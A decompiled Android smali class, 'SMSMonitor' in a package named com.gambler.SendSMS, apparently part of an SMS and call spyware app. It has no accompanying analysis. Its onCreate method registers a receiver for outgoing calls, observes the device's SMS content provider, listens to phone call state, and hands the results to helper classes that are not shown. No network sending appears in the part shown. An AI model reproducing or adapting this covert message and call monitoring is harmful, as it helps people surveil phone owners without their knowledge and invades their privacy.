.class public Lcom/gambler/SendSMS/SMSMonitor;
.super Landroid/app/Service;

# interfaces
.implements Lcom/gambler/SendSMS/j;


# instance fields
.field a:Lcom/gambler/SendSMS/h;

.field private b:Z

.field private c:Landroid/telephony/TelephonyManager;

.field private d:Z

.field private e:Ljava/lang/String;

.field private final f:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-boolean v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->b:Z

    iput-boolean v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->d:Z

    new-instance v0, Lcom/gambler/SendSMS/a;

    invoke-direct {v0, p0}, Lcom/gambler/SendSMS/a;-><init>(Lcom/gambler/SendSMS/SMSMonitor;)V

    iput-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->f:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method static synthetic a(Lcom/gambler/SendSMS/SMSMonitor;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->e:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic a(Lcom/gambler/SendSMS/SMSMonitor;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/SMSMonitor;->e:Ljava/lang/String;

    return-void
.end method

.method static synthetic a(Lcom/gambler/SendSMS/SMSMonitor;Z)V
    .locals 0

    iput-boolean p1, p0, Lcom/gambler/SendSMS/SMSMonitor;->d:Z

    return-void
.end method

.method static synthetic b(Lcom/gambler/SendSMS/SMSMonitor;)Z
    .locals 1

    iget-boolean v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->d:Z

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 5

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/gambler/SendSMS/SMSMonitor;->f:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/gambler/SendSMS/SMSMonitor;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/gambler/SendSMS/SMSMonitor;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    new-instance v3, Lcom/gambler/SendSMS/e;

    new-instance v4, Landroid/os/Handler;

    invoke-direct {v4}, Landroid/os/Handler;-><init>()V

    invoke-direct {v3, p0, v4}, Lcom/gambler/SendSMS/e;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/gambler/SendSMS/SMSMonitor;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->c:Landroid/telephony/TelephonyManager;

    iget-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->c:Landroid/telephony/TelephonyManager;

    new-instance v1, Lcom/gambler/SendSMS/b;

    invoke-direct {v1, p0}, Lcom/gambler/SendSMS/b;-><init>(Lcom/gambler/SendSMS/SMSMonitor;)V

    const/16 v2, 0x20

    invoke-virtual {v0, v1, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    new-instance v0, Lcom/gambler/SendSMS/h;

    invoke-direct {v0}, Lcom/gambler/SendSMS/h;-><init>()V

    iput-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    iget-object v0, p0, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0, p0}, Lcom/gambler/SendSMS/h;->a(Lcom/gambler/SendSMS/j;)V

    return-void
.end method
